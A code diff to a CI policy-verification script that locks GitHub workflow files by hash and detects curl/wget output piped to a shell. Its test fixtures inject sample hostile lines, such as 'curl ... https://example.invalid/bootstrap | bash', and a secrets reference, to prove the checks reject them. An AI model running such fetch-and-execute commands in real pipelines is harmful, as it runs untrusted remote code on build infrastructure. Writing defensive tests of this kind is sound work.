@@ -6055,6 +6055,8 @@ PYTHON_EVIDENCE_UPLOAD_PATHS = (
     "dist/python-evidence/attestations/*.json",
     "dist/python-evidence/base-python.${{ matrix.arch }}.secret-scan.json",
 )
+PYTHON_CI_WORKFLOW_SHA256 = "f2ed53077a320da53a96a834233c9fccd7ece1a381f770b1df15c4330fd2f021"
+PYTHON_CI_WORKFLOW_BYTE_LENGTH = 30249
 PYTHON_CI_JOB_IDS = ("changes", "self-tests", "build", "reproducibility", "python-required")
 WORKFLOW_SCANNER_DB_MAX_AGE_DAYS = 7
 WORKFLOW_TIMEOUT_MINUTES_MAXIMUM = 360
@@ -6175,16 +6177,26 @@ def _workflow_run_scalars(workflow: str) -> tuple[str, ...]:
 
 
 def _workflow_scanner_db_age_invalid(workflow: str) -> bool:
-    matches = re.findall(r"^  SCANNER_DB_MAX_AGE_DAYS:\s*(.*?)\s*$", workflow, re.MULTILINE)
-    if len(matches) != 1:
+    global_matches = re.findall(r"^  SCANNER_DB_MAX_AGE_DAYS:\s*(.*?)\s*$", workflow, re.MULTILINE)
+    block_matches = re.findall(r"^ *SCANNER_DB_MAX_AGE_DAYS:\s*(.*?)\s*$", workflow, re.MULTILINE)
+    if len(global_matches) != 1 or len(block_matches) != 1:
         return True
-    value = matches[0]
+    value = global_matches[0]
     if len(value) >= 2 and value[0] == value[-1] and value[0] in "\"'":
         value = value[1:-1]
     if re.fullmatch(r"[0-9]+", value) is None:
         return True
     age_days = int(value)
-    return not 0 < age_days <= WORKFLOW_SCANNER_DB_MAX_AGE_DAYS
+    if not 0 < age_days <= WORKFLOW_SCANNER_DB_MAX_AGE_DAYS:
+        return True
+    assignment_prefix = re.compile(
+        r"(?<![A-Za-z0-9_])SCANNER_DB_MAX_AGE_DAYS=[^\s;&|]+\s+"
+        r"/?(?:[A-Za-z0-9_.+-]+/)*python3(?:\.\d+)?\s+[^\n;&|]*assert-scanner-db-freshness\.py\b"
+    )
+    return any(
+        assignment_prefix.search(re.sub(r"\\\r?\n[ \t]*", " ", scalar)) is not None
+        for scalar in _workflow_run_scalars(workflow)
+    )
 
 
 def _workflow_checkout_sha_consistency_invalid(workflow: str, relative_path: str) -> bool:
@@ -6202,8 +6214,11 @@ def _workflow_checkout_sha_consistency_invalid(workflow: str, relative_path: str
 
 
 def _workflow_fetched_output_shell_pipeline_invalid(workflow: str) -> bool:
+    literal_path = r"/?(?:[A-Za-z0-9_.+-]+/)*"
     direct_pipeline = re.compile(
-        r"(?:^|[;&(|{])\s*(?:curl|wget)\b[^\n|;]*\|\s*(?:/usr/bin/|/bin/)?(?:sh|bash)\b",
+        rf"(?:^|[\s;&|(){{}}])(?:command[ \t]+(?:--[ \t]+)?)?"
+        rf"{literal_path}(?:curl|wget)(?![A-Za-z0-9_.+-])"
+        rf"[^\n|;&]*\|[ \t]*{literal_path}(?:sh|bash)(?![A-Za-z0-9_.+-])",
         re.MULTILINE,
     )
     for scalar in _workflow_run_scalars(workflow):
@@ -6211,6 +6226,27 @@ def _workflow_fetched_output_shell_pipeline_invalid(workflow: str) -> bool:
         if direct_pipeline.search(without_continuations) is not None:
             return True
     return False
+
+
+def python_ci_surface_lock_errors(workflow_bytes: bytes) -> list[str]:
+    errors: list[str] = []
+    actual_digest = hashlib.sha256(workflow_bytes).hexdigest()
+    actual_length = len(workflow_bytes)
+    digest_invalid = actual_digest != PYTHON_CI_WORKFLOW_SHA256
+    length_invalid = actual_length != PYTHON_CI_WORKFLOW_BYTE_LENGTH
+    # CHECK: python-ci-surface-digest
+    if digest_invalid:
+        errors.append(
+            "python CI executable surface SHA-256 mismatch: "
+            f"expected {PYTHON_CI_WORKFLOW_SHA256}, observed {actual_digest}"
+        )
+    # CHECK: python-ci-surface-length
+    if length_invalid:
+        errors.append(
+            "python CI executable surface byte-length mismatch: "
+            f"expected {PYTHON_CI_WORKFLOW_BYTE_LENGTH}, observed {actual_length}"
+        )
+    return errors
 
 
 def _workflow_declared_runner_timeout_invalid(workflow: str, job_ids: tuple[str, ...]) -> bool:
@@ -6474,7 +6510,8 @@ def python_ci_preflight_errors(workflow: str) -> list[str]:
     # CHECK: python-ci-scanner-db-age
     reject(
         _workflow_scanner_db_age_invalid(workflow),
-        "python CI scanner DB maximum age must be a positive integer no greater than 7 days",
+        "python CI scanner DB age policy requires one global block declaration no greater than 7 days, "
+        "no additional block declaration, and no direct assignment prefix",
     )
     # CHECK: python-ci-checkout-consistency
     reject(
@@ -6556,6 +6593,7 @@ def _python_ci_semantic_fixtures(workflow: str) -> list[tuple[str, str, str]]:
         "      - name: Log in to registry\n"
         "        uses: docker/login-action@1111111111111111111111111111111111111111\n\n"
     )
+    surface_mutant = "##" + workflow[2:]
     fixtures = [
         (
             "push job path condition restored",
@@ -6820,7 +6858,21 @@ def _python_ci_semantic_fixtures(workflow: str) -> list[tuple[str, str, str]]:
         (
             "scanner DB maximum age exceeds policy",
             workflow.replace('  SCANNER_DB_MAX_AGE_DAYS: "7"\n', '  SCANNER_DB_MAX_AGE_DAYS: "365"\n', 1),
-            "python CI scanner DB maximum age must be a positive integer no greater than 7 days",
+            "python CI scanner DB age policy requires one global block declaration no greater than 7 days, "
+            "no additional block declaration, and no direct assignment prefix",
+        ),
+        (
+            "scanner DB step override added",
+            workflow.replace(
+                "      - name: Prepare scanner databases\n        run: |\n",
+                "      - name: Prepare scanner databases\n"
+                "        env:\n"
+                '          SCANNER_DB_MAX_AGE_DAYS: "365"\n'
+                "        run: |\n",
+                1,
+            ),
+            "python CI scanner DB age policy requires one global block declaration no greater than 7 days, "
+            "no additional block declaration, and no direct assignment prefix",
         ),
         (
             "checkout SHA consistency changed",
@@ -6836,7 +6888,21 @@ def _python_ci_semantic_fixtures(workflow: str) -> list[tuple[str, str, str]]:
                 "      - name: Run python tool self-tests and lock validation\n"
                 "        run: |\n"
                 "          set -euo pipefail\n"
-                "          curl --fail https://example.invalid/bootstrap | bash\n",
+                "          /usr/bin/curl --fail https://example.invalid/bootstrap | bash\n",
+                1,
+            ),
+            "python CI run scalars must not pipe curl or wget output directly to sh or bash",
+        ),
+        (
+            "command-prefixed network fetch piped to shell",
+            workflow.replace(
+                "      - name: Run python tool self-tests and lock validation\n"
+                "        run: |\n"
+                "          set -euo pipefail\n",
+                "      - name: Run python tool self-tests and lock validation\n"
+                "        run: |\n"
+                "          set -euo pipefail\n"
+                "          command curl --fail https://example.invalid/bootstrap | /usr/bin/bash\n",
                 1,
             ),
             "python CI run scalars must not pipe curl or wget output directly to sh or bash",
@@ -6845,6 +6911,12 @@ def _python_ci_semantic_fixtures(workflow: str) -> list[tuple[str, str, str]]:
             "declared runner timeout removed",
             workflow.replace("    timeout-minutes: 10\n", "", 1),
             "python CI declared runner-backed jobs must each have exactly one literal timeout-minutes from 1 to 360",
+        ),
+        (
+            "surface digest fallback",
+            surface_mutant,
+            "python CI executable surface SHA-256 mismatch: "
+            f"expected {PYTHON_CI_WORKFLOW_SHA256}, observed {hashlib.sha256(surface_mutant.encode()).hexdigest()}",
         ),
     ]
     for label, mutated, _ in fixtures:
@@ -6919,8 +6991,11 @@ def _python_ci_detect_oracle(workflow: str) -> None:
 
 
 def check_python_ci_preflight_semantic_self_test(only_label: str | None = None) -> None:
-    workflow = read(".github/workflows/python-ci.yaml")
+    workflow_bytes = (ROOT / ".github/workflows/python-ci.yaml").read_bytes()
+    workflow = workflow_bytes.decode()
     baseline = python_ci_preflight_errors(workflow)
+    if not baseline:
+        baseline.extend(python_ci_surface_lock_errors(workflow_bytes))
     require(not baseline, "python CI preflight semantic baseline failed: " + "; ".join(baseline))
     require(_python_ci_yaml_parse_error(workflow) is None, "python CI committed workflow must parse as YAML")
     if only_label is None:
@@ -6933,7 +7008,10 @@ def check_python_ci_preflight_semantic_self_test(only_label: str | None = None) 
         selected += 1
         parse_error = _python_ci_yaml_parse_error(mutated)
         require(parse_error is None, f"python CI semantic mutation is not valid YAML [{label}]: {parse_error}")
+        mutated_bytes = mutated.encode()
         errors = python_ci_preflight_errors(mutated)
+        if not errors:
+            errors.extend(python_ci_surface_lock_errors(mutated_bytes))
         if expected_error not in errors:
             raise VerifyError(f"python CI semantic mutation unexpectedly passed: {label}")
         require(
@@ -6953,10 +7031,14 @@ def check_python_ci_preflight() -> None:
     workflow_path = ROOT / ".github/workflows/python-ci.yaml"
     workflow_bytes = workflow_path.read_bytes()
     errors = python_ci_preflight_errors(workflow_bytes.decode())
+    if not errors:
+        errors.extend(python_ci_surface_lock_errors(workflow_bytes))
     require(not errors, "python CI preflight contract failed: " + "; ".join(errors))
 
 
 PUBLISH_PYTHON_WORKFLOW = ".github/workflows/publish-python.yaml"
+PUBLISH_PYTHON_WORKFLOW_SHA256 = "ab01553fb26c685c8a3e91d88dfdec77ae36601f4604ff0db93af9e7ee79d6e3"
+PUBLISH_PYTHON_WORKFLOW_BYTE_LENGTH = 85732
 
 
 def _workflow_action_with_text(step: str) -> str:
@@ -6985,6 +7067,28 @@ def _shell_array_tokens(run: str, name: str) -> tuple[str, ...]:
         return tuple(shlex.split(match.group("body"), comments=False, posix=True))
     except ValueError:
         return ()
+
+
+def publish_python_surface_lock_errors(workflow_bytes: bytes) -> list[str]:
+    """Prevent drift from the review-authorized baseline; this is not an adversarial guarantee."""
+    errors: list[str] = []
+    actual_digest = hashlib.sha256(workflow_bytes).hexdigest()
+    actual_length = len(workflow_bytes)
+    digest_invalid = actual_digest != PUBLISH_PYTHON_WORKFLOW_SHA256
+    length_invalid = actual_length != PUBLISH_PYTHON_WORKFLOW_BYTE_LENGTH
+    # CHECK: publish-python-surface-digest
+    if digest_invalid:
+        errors.append(
+            "publish Python executable surface SHA-256 mismatch: "
+            f"expected {PUBLISH_PYTHON_WORKFLOW_SHA256}, observed {actual_digest}"
+        )
+    # CHECK: publish-python-surface-length
+    if length_invalid:
+        errors.append(
+            "publish Python executable surface byte-length mismatch: "
+            f"expected {PUBLISH_PYTHON_WORKFLOW_BYTE_LENGTH}, observed {actual_length}"
+        )
+    return errors
 
 
 PUBLISH_PYTHON_TRIGGER = (
@@ -7357,7 +7461,10 @@ def publish_python_workflow_errors(workflow: str) -> list[str]:
         and len(docker_floor_matches) == 1
         and tuple(int(component) for component in docker_floor_matches[0]) >= (28, 0, 0)
     )
-    preflight_secret_surface_invalid = re.search(r"\$\{\{\s*secrets\.", preflight) is not None
+    preflight_secret_surface_invalid = any(
+        re.search(r"(?<![A-Za-z0-9_])secrets(?![A-Za-z0-9_])", expression, re.IGNORECASE) is not None
+        for expression in re.findall(r"\$\{\{(.*?)\}\}", preflight, re.DOTALL)
+    )
 
     # CHECK: python-publish-trigger
     reject(trigger_invalid, "Python publish trigger contract mismatch")
@@ -7416,7 +7523,8 @@ def publish_python_workflow_errors(workflow: str) -> list[str]:
     # CHECK: python-publish-scanner-db-age
     reject(
         _workflow_scanner_db_age_invalid(workflow),
-        "Python publish scanner DB maximum age must be a positive integer no greater than 7 days",
+        "Python publish scanner DB age policy requires one global block declaration no greater than 7 days, "
+        "no additional block declaration, and no direct assignment prefix",
     )
     # CHECK: python-publish-checkout-consistency
     reject(
@@ -7431,10 +7539,15 @@ def publish_python_workflow_errors(workflow: str) -> list[str]:
     # CHECK: python-publish-buildkit-host-network
     reject(
         buildkit_host_network_invalid,
-        "Python release preflight must configure and verify BuildKit host networking",
+        "Python release preflight must retain canonical BuildKit network=host configuration and the "
+        "Docker-inspect assignment/comparison block",
     )
     # CHECK: python-publish-docker-server-floor
-    reject(docker_server_floor_invalid, "Python release preflight Docker server floor must be at least 28.0.0")
+    reject(
+        docker_server_floor_invalid,
+        "Python release preflight must pass one Docker Server.Version observation to a Python block with a "
+        "literal floor of at least 28.0.0",
+    )
     # CHECK: python-publish-runner-timeout
     reject(
         _workflow_declared_runner_timeout_invalid(workflow, PUBLISH_PYTHON_RUNNER_JOB_IDS),
@@ -7443,7 +7556,7 @@ def publish_python_workflow_errors(workflow: str) -> list[str]:
     # CHECK: python-publish-preflight-secret-surface
     reject(
         preflight_secret_surface_invalid,
-        "Python release preflight must not reference secrets.*",
+        "Python release preflight must not contain the secrets identifier in a GitHub expression",
     )
     return errors
 
@@ -7452,6 +7565,7 @@ def _publish_python_workflow_fixtures(workflow: str) -> list[tuple[str, str, str
     def changed(label: str, old: str, new: str, reason: str, occurrence: int = 1) -> tuple[str, str, str]:
         return label, _replace_nth(workflow, old, new, occurrence), reason
 
+    surface_mutant = "##" + workflow[2:]
     return [
         changed("trigger", 'tags: ["python/v*"]', 'tags: ["v*"]', "Python publish trigger contract mismatch"),
         changed("jobs", "  anonymous-verification:\n", "  anonymous-check:\n", "Python publish job graph mismatch"),
@@ -7642,7 +7756,16 @@ def _publish_python_workflow_fixtures(workflow: str) -> list[tuple[str, str, str
             "scanner-db-maximum-age",
             '  SCANNER_DB_MAX_AGE_DAYS: "7"\n',
             '  SCANNER_DB_MAX_AGE_DAYS: "365"\n',
-            "Python publish scanner DB maximum age must be a positive integer no greater than 7 days",
+            "Python publish scanner DB age policy requires one global block declaration no greater than 7 days, "
+            "no additional block declaration, and no direct assignment prefix",
+        ),
+        changed(
+            "scanner-db-inline-assignment",
+            '          python3 tools/assert-scanner-db-freshness.py --max-age-days "${SCANNER_DB_MAX_AGE_DAYS}"\n',
+            "          SCANNER_DB_MAX_AGE_DAYS=365 python3 tools/assert-scanner-db-freshness.py "
+            '--max-age-days "${SCANNER_DB_MAX_AGE_DAYS}"\n',
+            "Python publish scanner DB age policy requires one global block declaration no greater than 7 days, "
+            "no additional block declaration, and no direct assignment prefix",
         ),
         (
             "checkout-sha-consistency",
@@ -7665,20 +7788,41 @@ def _publish_python_workflow_fixtures(workflow: str) -> list[tuple[str, str, str
             "          CONTAINER_ENGINE: docker\n"
             "        run: |\n"
             "          set -euo pipefail\n"
-            "          curl --fail https://example.invalid/bootstrap | bash\n",
+            "          /usr/bin/wget -qO- https://example.invalid/bootstrap | /bin/sh\n",
+            "Python publish run scalars must not pipe curl or wget output directly to sh or bash",
+        ),
+        changed(
+            "command-dash-prefixed-network-fetch-piped-to-shell",
+            "      - name: Run runtime and evidence gates\n"
+            "        env:\n"
+            "          AMD64_DIGEST: ${{ steps.index.outputs.amd64_digest }}\n"
+            "          ARM64_DIGEST: ${{ steps.index.outputs.arm64_digest }}\n"
+            "          CONTAINER_ENGINE: docker\n"
+            "        run: |\n"
+            "          set -euo pipefail\n",
+            "      - name: Run runtime and evidence gates\n"
+            "        env:\n"
+            "          AMD64_DIGEST: ${{ steps.index.outputs.amd64_digest }}\n"
+            "          ARM64_DIGEST: ${{ steps.index.outputs.arm64_digest }}\n"
+            "          CONTAINER_ENGINE: docker\n"
+            "        run: |\n"
+            "          set -euo pipefail\n"
+            "          command -- wget -qO- https://example.invalid/bootstrap | /usr/bin/bash\n",
             "Python publish run scalars must not pipe curl or wget output directly to sh or bash",
         ),
         changed(
             "buildkit-host-network",
             "            network=host\n",
             "            network=bridge\n",
-            "Python release preflight must configure and verify BuildKit host networking",
+            "Python release preflight must retain canonical BuildKit network=host configuration and the "
+            "Docker-inspect assignment/comparison block",
         ),
         changed(
             "docker-server-floor",
             "          if version < (28, 0, 0):\n",
             "          if version < (1, 0, 0):\n",
-            "Python release preflight Docker server floor must be at least 28.0.0",
+            "Python release preflight must pass one Docker Server.Version observation to a Python block with a "
+            "literal floor of at least 28.0.0",
         ),
         changed(
             "declared-runner-timeout",
@@ -7692,15 +7836,25 @@ def _publish_python_workflow_fixtures(workflow: str) -> list[tuple[str, str, str
             "        env:\n          BUILDER_NAME: ${{ steps.buildx.outputs.name }}\n",
             "        env:\n"
             "          BUILDER_NAME: ${{ steps.buildx.outputs.name }}\n"
-            "          REVIEW_PROBE: ${{ secrets.REVIEW_PROBE }}\n",
-            "Python release preflight must not reference secrets.*",
+            "          REVIEW_PROBE: ${{ SECRETS['REVIEW_PROBE'] }}\n",
+            "Python release preflight must not contain the secrets identifier in a GitHub expression",
+        ),
+        (
+            "surface-digest-fallback",
+            surface_mutant,
+            "publish Python executable surface SHA-256 mismatch: "
+            f"expected {PUBLISH_PYTHON_WORKFLOW_SHA256}, observed "
+            f"{hashlib.sha256(surface_mutant.encode()).hexdigest()}",
         ),
     ]
 
 
 def check_publish_python_workflow_self_test(only_label: str | None = None) -> None:
-    workflow = read(PUBLISH_PYTHON_WORKFLOW)
+    workflow_bytes = (ROOT / PUBLISH_PYTHON_WORKFLOW).read_bytes()
+    workflow = workflow_bytes.decode()
     baseline = publish_python_workflow_errors(workflow)
+    if not baseline:
+        baseline.extend(publish_python_surface_lock_errors(workflow_bytes))
     require(not baseline, "publish Python workflow baseline failed: " + "; ".join(baseline))
     fixtures = _publish_python_workflow_fixtures(workflow)
     selected = 0
@@ -7710,8 +7864,14 @@ def check_publish_python_workflow_self_test(only_label: str | None = None) -> No
         selected += 1
         parse_error = _python_ci_yaml_parse_error(mutated)
         require(parse_error is None, f"publish Python workflow mutation is not valid YAML [{label}]: {parse_error}")
-        if expected not in publish_python_workflow_errors(mutated):
+        mutated_bytes = mutated.encode()
+        errors = publish_python_workflow_errors(mutated)
+        if not errors:
+            errors.extend(publish_python_surface_lock_errors(mutated_bytes))
+        if expected not in errors:
             raise VerifyError(f"publish Python workflow mutation unexpectedly passed: {label}")
+        if label == "surface-digest-fallback":
+            require(errors == [expected], f"publish Python surface fixture returned an unexpected error set: {errors}")
         print(f"publish Python workflow mutation rejected [{label}] parse=ok diagnostic={expected}")
     if only_label is None:
         require(selected == len(fixtures), "publish Python workflow fixture inventory mismatch")
@@ -7744,6 +7904,8 @@ def check_publish_python_workflow() -> None:
     workflow_bytes = (ROOT / PUBLISH_PYTHON_WORKFLOW).read_bytes()
     workflow = workflow_bytes.decode()
     errors = publish_python_workflow_errors(workflow)
+    if not errors:
+        errors.extend(publish_python_surface_lock_errors(workflow_bytes))
     require(not errors, "publish Python workflow contract failed: " + "; ".join(errors))
 
 
